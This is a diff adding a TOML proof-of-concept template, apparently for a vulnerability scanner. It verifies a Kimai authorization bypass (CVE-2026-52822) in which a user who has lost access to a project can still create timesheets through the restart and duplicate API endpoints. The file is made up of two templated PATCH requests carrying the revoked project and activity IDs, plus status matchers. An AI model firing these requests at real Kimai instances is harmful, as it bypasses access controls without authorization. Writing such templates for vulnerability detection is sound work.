@@ -1,0 +1,48 @@
+[info]
+author = "ave"
+description = "验证Kimai的授权漏洞，用户在失去项目访问权限后仍可通过重启或复制历史 timesheet 创建新记录，从而绕过访问控制"
+id = "POC-AVE-2026-0382"
+name = "Kimai Timesheet Restart/Duplicate Authorization Bypass"
+severity = "medium"
+tags = ["ave-2026-0382"]
+vuln_id = [
+    "CVE-2026-52822",
+    "AVE-2026-0382",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "PATCH"
+path = "/{{BaseURL}}/api/timesheets/{{TimesheetID}}/restart"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"activity_id": "{{RevokedActivityID}}", "project_id": "{{RevokedProjectID}}"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "PATCH"
+path = "/{{BaseURL}}/api/timesheets/{{TimesheetID}}/duplicate"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"activity_id": "{{RevokedActivityID}}", "project_id": "{{RevokedProjectID}}"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [201]
+type = "status"
